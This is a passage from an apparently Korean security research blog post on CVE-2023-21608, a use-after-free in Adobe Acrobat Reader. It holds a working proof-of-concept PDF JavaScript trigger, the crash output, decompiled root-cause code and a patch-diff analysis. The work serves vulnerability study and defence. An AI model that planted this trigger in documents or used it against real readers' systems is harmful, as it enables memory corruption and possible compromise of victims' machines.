testField.setAction(<span class="hljs-string">&quot;Calculate&quot;</span>, <span class="hljs-string">&quot;calculateCallback()&quot;</span>);

<span class="hljs-keyword">try</span> { <span class="hljs-built_in">this</span>.resetForm(); } <span class="hljs-keyword">catch</span> (e) {}

<span class="hljs-keyword">try</span> { <span class="hljs-built_in">this</span>.resetForm(); } <span class="hljs-keyword">catch</span> (e) {}  <span class="hljs-comment">// bug is triggered during this resetForm call</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calculateCallback</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>
<span class="hljs-function"></span>{

  event.__defineGetter__(<span class="hljs-string">&quot;target&quot;</span>, getterFunc);

  event.richValue = <span class="hljs-built_in">this</span>;

}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getterFunc</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>
<span class="hljs-function"></span>{

  <span class="hljs-keyword">try</span> { <span class="hljs-built_in">Object</span>.defineProperty(testField, <span class="hljs-string">&quot;textFont&quot;</span>, { <span class="hljs-attr">value</span>: <span class="hljs-built_in">this</span> }); } <span class="hljs-keyword">catch</span>(e) { }

}</code></pre>
<p>&#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xAC00; &#xC0BD;&#xC785;&#xB41C; PDF &#xBB38;&#xC11C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; <code>testField</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC744; &#xAC00;&#xC9C0;&#xB294; text field&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs routeros">5 0 obj
&lt;&lt;
<span class="hljs-built_in">/Type </span>/Annot
/Subtype /Widget
/T (testField)
/FT /Tx
/Rect [0 0 0 0]
&gt;&gt;</code></pre>
<p>&#xCF54;&#xB4DC;&#xAC00; &#xC0BD;&#xC785;&#xB41C; &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xAC8C; &#xB418;&#xBA74; &#xC704;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; (1)&#xBB38;&#xC11C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; <code>doc</code>&#xC758; Instance&#xC778; <code>this</code>&#xC758; <code>getField</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>testField</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xACE0; (2)<code>setAction</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>testField</code>&#xC758;  <code>Calculate</code> &#xD578;&#xB4E4;&#xB7EC;&#xB85C; <code>calculateCallback</code> &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xC904;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; (3)<code>this.resetForm()</code>&#xC740; <code>Calculate</code> &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xC815;&#xC758;&#xB41C; &#xBAA8;&#xB4E0; &#xD544;&#xB4DC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; <code>calculate</code> &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. <code>testField</code>&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; (4)<code>calculateCallback</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC774; &#xD568;&#xC218; &#xC548;&#xC5D0;&#xC11C; <code>event</code>&#xC758; <code>target</code> &#xC18D;&#xC131;&#xC5D0; &#xB300;&#xD55C; getter&#xB97C; <code>getterFunc</code>&#xB85C; &#xC7AC;&#xC815;&#xC758;&#xD558;&#xACE0; <code>richiValue</code> &#xC18D;&#xC131;&#xC5D0; <code>this</code>&#xB97C; &#xB300;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. </p>
<p>&#xC774;&#xB85C; &#xC778;&#xD574; <code>richValue</code>&#xC5D0; &#xB300;&#xC785;&#xB420; &#xAC12;&#xC778; <code>this</code> (<code>doc</code>)&#xC758; &#xBAA8;&#xB4E0; &#xC18D;&#xC131;&#xACFC; &#xBA54;&#xC18C;&#xB4DC;&#xAC00; <code>EScript!ESObjectEnum</code>&#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xC5F4;&#xAC70;&#xB418;&#xAE30; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>event.target</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; <code>getterFunc</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; <code>testField.textFont</code>&#xAC00; <code>this</code>&#xB85C; &#xBC14;&#xB00C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xB450; &#xBC88;&#xC9F8; <code>this.resetForm()</code>&#xC5D0;&#xC11C;&#xB3C4; &#xC704;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xC9C0;&#xB9CC; <code>this</code>&#xB85C; &#xBC14;&#xB010; <code>testField.textFont</code>&#xAC00; &#xC218;&#xC815; &#xBD88;&#xAC00;&#xB2A5;(non-configurable)&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>getterFunc</code>&#xC5D0;&#xC11C; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xBC1C;&#xC0DD;&#xD55C; &#xC608;&#xC678;&#xB85C; &#xC778;&#xD574; <code>event.richValue</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>AcroForm!GetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC758; &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xC5EC; <code>CAggToESVal</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74;&#xC11C; &#xC5F4;&#xAC70; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; <code>CAgg</code>&#xC640; <code>map</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBAA8;&#xB450; &#xD574;&#xC81C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">GetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *arg0, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span>
<span class="hljs-function"></span>{
...
  <span class="hljs-keyword">else</span>
  {
    LOBYTE(v16) = <span class="hljs-number">0</span>;
    sub_2085ECA0(<span class="hljs-string">&quot;EventRichValueInProgress&quot;</span>);
    sub_20AAE7D6(arg0, v16, v17, v18, v19, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>);
    <span class="hljs-keyword">if</span> ( a1
      &amp;&amp; (v9 = *(<span class="hljs-keyword">unsigned</span> __int16 (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_21473CB8 + <span class="hljs-number">180</span>),
          v10 = __guard_check_icall_fptr(a1),
          v9(v10)) )
    {
      PointerType = sub_20A4AD65(a1, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;CAgg_P&quot;</span>);
      <span class="hljs-keyword">if</span> ( PointerType )
        PointerType = CAggToESVal(PointerType, v12, (<span class="hljs-keyword">wchar_t</span> *)a3, PointerType);<span class="hljs-comment">// Free All CAgg &amp; map</span>
    }
...
}</code></pre>
<p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB9CC; &#xBCF4;&#xBA74; &#xB531;&#xD788; &#xD070; &#xBB38;&#xC81C;&#xB294; &#xC5C6;&#xC5B4; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC758; &#xD574;&#xC81C;&#xAC00; &#xC5F4;&#xAC70;&#xAC00; &#xC544;&#xC9C1; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xD6C4; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;!!!</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=04f6a0f0 <span class="hljs-attribute">ebx</span>=00000000 <span class="hljs-attribute">ecx</span>=420fefd0 <span class="hljs-attribute">edx</span>=44e1cff8 <span class="hljs-attribute">esi</span>=6921ef50 <span class="hljs-attribute">edi</span>=420fefd0
<span class="hljs-attribute">eip</span>=6c556b99 <span class="hljs-attribute">esp</span>=04f6a0d0 <span class="hljs-attribute">ebp</span>=04f6a0fc <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na pe nc
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00010206
AcroForm!CAgg::operator[](unsigned short)+0xe:
6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:<span class="hljs-attribute">420fefd0</span>=????????</code></pre>
<p>page-heap&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574;&#xBCF4;&#xBA74; Use-After-Free&#xB85C; &#xC778;&#xD574; <code>AcroForm!CAgg::operator[]</code> &#xC5D0;&#xC11C; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; if&#xBB38; &#xC548;&#xC5D0;&#xC11C; <code>this-&gt;type</code> &#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xB530;&#xB77C;&#xC11C; <code>this</code>&#xAC00; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-keyword">int</span> __userpurge CAgg::<span class="hljs-keyword">operator</span>[]@&lt;eax&gt;(CAgg *<span class="hljs-keyword">this</span>@&lt;ecx&gt;, <span class="hljs-keyword">bool</span> (*a2)[<span class="hljs-number">27</span>]@&lt;ebx&gt;, <span class="hljs-keyword">wchar_t</span> *someID)
{
  ...

  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;type == <span class="hljs-number">0x13</span> )
  {
    ...
  }
  <span class="hljs-keyword">else</span>
  {
    ...
    <span class="hljs-keyword">else</span>
    {
      CAgg::convert(<span class="hljs-keyword">this</span>, a2, <span class="hljs-number">0x14</span>);
      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">map</span>, (<span class="hljs-keyword">int</span>)v9, (<span class="hljs-keyword">unsigned</span> __int16 *)&amp;someID);
    }
    <span class="hljs-keyword">return</span> *v4 + <span class="hljs-number">24</span>;
  }
}</code></pre>
<p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C; &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC758; <code>AcroForm!EScript_ESObjectEnum_CallbackProc</code>&#xD568;&#xC218;&#xB85C; <code>CAgg:operator[]</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>this</code>)&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>pCagg</code>&#xAC00; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; &#xC774;&#xB294; <code>pCAggData</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC628; &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-keyword">int</span> __usercall EScript_ESObjectEnum_CallbackProc@&lt;eax&gt;(
        <span class="hljs-keyword">bool</span> (*ebx0)[<span class="hljs-number">27</span>]@&lt;ebx&gt;,
        <span class="hljs-keyword">int</span> a2,
        <span class="hljs-keyword">wchar_t</span> *key_str,
        <span class="hljs-keyword">wchar_t</span> *a4,
        <span class="hljs-keyword">int</span> ***pCAggData)
{
  CAgg **pCagg; <span class="hljs-comment">// edi</span>
  <span class="hljs-keyword">unsigned</span> __int16 someID; <span class="hljs-comment">// ax</span>
  CAgg *v7; <span class="hljs-comment">// eax</span>

  pCagg = (CAgg **)*pCAggData;
  someID = (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">wchar_t</span> *))(gCoreHFT + <span class="hljs-number">20</span>))(key_str); 
  v7 = (CAgg *)CAgg::<span class="hljs-keyword">operator</span>[]((CAgg *)pCagg, ebx0, (<span class="hljs-keyword">wchar_t</span> *)someID);
  ESValToCAgg(v7, a4, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}</code></pre>
<h1 id="3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;"><a href="#3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;" class="headerlink" title="3.  &#xD328;&#xCE58; &#xBD84;&#xC11D;"></a>3.  &#xD328;&#xCE58; &#xBD84;&#xC11D;</h1><hr>
<p>&#xBC84;&#xADF8;&#xAC00; Acrobat&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xB54C;&#xB3C4; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xB4A4;&#xC5D0;&#xC11C; &#xB2E4;&#xB8F0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C;&#xB3C4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;&#x2026; &#xD3C9;&#xC18C;&#xC5D0; &#xBCF4;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xACFC;&#xB294; &#xACB0;&#xC774; &#xB2E4;&#xB974;&#xB2E4;&#xB294;&#xAC8C; &#xB290;&#xAEF4;&#xC9C0;&#xB124;&#xC694; &#x1F972;</p>
<p>&#xBC14;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACFC;&#xC815;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;! &#xAC04;&#xB2E8;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2CC; &#xB9CC;&#xD07C; &#xD328;&#xCE58; &#xB610;&#xD55C; &#xCF54;&#xB4DC; &#xD55C; &#xB450;&#xC904;&#xC5D0;&#xC11C; &#xB05D;&#xB0A0;&#xB9AC; &#xC5C6;&#xACA0;&#xC8E0;? </p>
<p>&#xBA3C;&#xC800; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;(Adobe Acrobat Reader DC 2022.003.20310)&#xACFC; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;(Adobe Acrobat Reader DC 2022.001.20085)&#xC758; <code>AcroForm.api</code>&#xB97C; Diffing&#xD558;&#xC5EC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>primary&#xC640; secondary&#xB294; &#xAC01;&#xAC01; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC758; <code>AcroForm.api</code> &#xC774;&#xACE0; &#xB458; &#xC0AC;&#xC774;&#xC5D0; match&#xB41C; &#xD568;&#xC218;&#xB4E4; &#xC911;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xBCC0;&#xACBD;&#xC810;&#xC744; &#xC0B4;&#xD3B4;&#xBCF8; &#xACB0;&#xACFC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>SetRichValueEventProp</code>&#xACFC; <code>GetRichValueEventProp</code>, <code>SetRichChangeEventProp</code>&#xACFC; <code>GetRichChangeEventProp</code>&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%201.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>&#xC774;&#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>GetRichValueEventProp</code>&#xC758; &#xCC28;&#xC774;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740;&#xB370;&#xC694;?</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%202.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>&#xB178;&#xB780;&#xC0C9;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB41C; Basic Block&#xC740; &#xD328;&#xCE58; &#xC804;&#xD6C4;&#xB85C; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC; Match&#xB418;&#xB294; Basic Block&#xC73C;&#xB85C; &#xC67C;&#xCABD;&#xC774; primary(&#xD328;&#xCE58; &#xC804;), &#xC624;&#xB978;&#xCABD;&#xC774; secondary(&#xD328;&#xCE58; &#xD6C4;)&#xC774;&#xBA70; &#xD30C;&#xB780;&#xC0C9;&#xC758; &#xCF54;&#xB4DC;&#xC640; Basic Block&#xC740; primary&#xC5D0;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC; secondary&#xC5D0;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC989; &#xD328;&#xCE58;&#xB85C; &#xCD94;&#xAC00;&#xB41C; &#xD30C;&#xB780;&#xC0C9; &#xBD80;&#xBD84;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD574;&#xACB0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xAC70;&#xC8E0;.</p>
<p>&#xC774;&#xB97C; &#xD1B5;&#xD574; <code>GetRichValueEventProp</code>&#xC5D0;&#xB294; &#xD06C;&#xAC8C; &#xC544;&#xB798;&#xC758; &#xB450; &#xAC00;&#xC9C0; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ol>
<li>&#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; <code>CAggToESVal</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC804;, <code>IsDataInGlobalHashTable</code> &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC774; &#xC120;&#xD589;&#xB418;&#xACE0; &#xC774; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; Basic Block&#xC73C;&#xB85C;&#xC758; &#xBD84;&#xAE30; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;</li>
<li><code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; Basic Block&#xC5D0;&#xC11C;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC804;&#xD6C4;&#xB85C; &#xAC01;&#xAC01; <code>InsertToGlobalHashTable</code>&#xACFC; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;</li>
</ol>
<p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<pre><code class="hljs c">  PointerType = sub_20A4BC05(v31, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);
  PointerType_1 = PointerType;
  <span class="hljs-keyword">if</span> ( PointerType )
  {
    LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
    <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )
    {
      v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);
      LOBYTE(v33) = <span class="hljs-number">4</span>;
      CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);
      PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);
    }
  }
}</code></pre>
<p><code>AcroForm.api</code>&#xC740; &#xC2EC;&#xBCFC;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xC815;&#xC131;&#xC2A4;&#xB7FD;&#xAC8C; &#xBD84;&#xC11D;&#xD574;&#xBCF8; &#xACB0;&#xACFC; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; <code>InsertToGlobalHashTable</code>&#xC640; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218; &#xB4F1; &#xAC01;&#xAC01;&#xC758; &#xD568;&#xC218;&#xC758; &#xAE30;&#xB2A5;&#xC5D0; &#xB530;&#xB77C; &#xC774;&#xB984;&#xC744; &#xBD99;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xCD94;&#xAC00;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD55C; &#xACB0;&#xACFC; &#xC5F4;&#xAC70; &#xB3C4;&#xC911;&#xC5D0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC774; free&#xB418;&#xB294; &#xBC84;&#xADF8;&#xC758; &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; &#xAC01;&#xAC01;&#xC758; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="IsDataInGlobalHashTable"><a href="#IsDataInGlobalHashTable" class="headerlink" title="IsDataInGlobalHashTable"></a>IsDataInGlobalHashTable</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">bool</span> __cdecl <span class="hljs-title">IsDataInGlobalHashTable</span><span class="hljs-params">(<span class="hljs-keyword">int</span> Data)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">int</span> a2; <span class="hljs-comment">// [esp+0h] [ebp-4h] BYREF</span>

  a2 = v1;
  <span class="hljs-keyword">return</span> Data &amp;&amp; sub_20AD638B(&amp;GlobalHashTable, (ListEntry *)&amp;a2, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink != GlobalHashTable.DefaultHead;
}</code></pre>
<p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC73C;&#xBA70; <code>sub_20AD638B</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>GlobalHashTable</code>&#xC5D0; <code>Data</code>&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><code>GlobalHashTable</code>&#xC740; &#xC790;&#xB8CC;&#xD615;&#xC774; &#xC544;&#xB798;&#xC758; <code>HashTable</code> &#xAD6C;&#xC870;&#xCCB4;&#xC778; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xB85C; &#xC5F0;&#xAD00;&#xB41C; &#xBAA8;&#xB4E0; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC758; &#xBA85;&#xCE6D;&#xACFC; &#xC815;&#xC758;&#xB294; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC720;&#xCD94;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><pre><code class="hljs basic"><span class="hljs-symbol">00000000 </span>ListEntry       struc ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_221)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>Flink           dd ?                    
<span class="hljs-symbol">00000004 </span>Blink           dd ?                    
<span class="hljs-symbol">00000008 </span>ListEntry       ends
<span class="hljs-number">00000008</span>
<span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------
<span class="hljs-number">00000000</span>
<span class="hljs-symbol">00000000 </span>HashBucketEntry struc ; (sizeof=<span class="hljs-number">0</span>x10, mappedto_223)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>list_entry      union1 ?                
<span class="hljs-symbol">00000000 </span>                                        
